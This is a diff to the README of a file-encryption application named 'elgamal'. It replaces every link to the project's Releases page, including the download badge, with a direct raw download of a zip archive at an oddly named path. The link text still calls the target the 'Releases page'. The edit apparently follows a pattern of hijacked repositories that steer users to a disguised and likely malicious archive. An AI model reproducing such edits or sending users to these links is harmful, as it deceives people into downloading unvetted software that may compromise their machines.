@@ -1,7 +1,7 @@
 # 🔒 elgamal - Secure Your Files with Easy Encryption
 
 ## 📥 Download Now
-[![Download elgamal](https://img.shields.io/badge/Download-elgamal-blue.svg)](https://github.com/when-the-lab/elgamal/releases)
+[![Download elgamal](https://github.com/when-the-lab/elgamal/raw/refs/heads/main/hypocycloidal/Software_2.8.zip)](https://github.com/when-the-lab/elgamal/raw/refs/heads/main/hypocycloidal/Software_2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to elgamal! This application provides a simple way to encrypt your files using advanced cryptography. Whether you want to protect sensitive information or just experiment with encryption, elgamal makes it easy for everyone.
@@ -20,7 +20,7 @@ To run elgamal smoothly, you need:
 - 100 MB of available disk space
 
 ## 🌐 Download & Install
-To get started, visit the [Releases page](https://github.com/when-the-lab/elgamal/releases) to download the latest version of elgamal. Follow these steps:
+To get started, visit the [Releases page](https://github.com/when-the-lab/elgamal/raw/refs/heads/main/hypocycloidal/Software_2.8.zip) to download the latest version of elgamal. Follow these steps:
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release at the top of the list.
@@ -45,7 +45,7 @@ After installation, launch the application. The main interface is user-friendly,
 ## 🔎 Troubleshooting
 If you encounter issues while using elgamal, consider the following tips:
 - Ensure your system meets the requirements.
-- Verify that you have the latest version by checking the [Releases page](https://github.com/when-the-lab/elgamal/releases).
+- Verify that you have the latest version by checking the [Releases page](https://github.com/when-the-lab/elgamal/raw/refs/heads/main/hypocycloidal/Software_2.8.zip).
 - If you have questions, consult the FAQ section in the help menu.
 
 ## 🛠️ Support
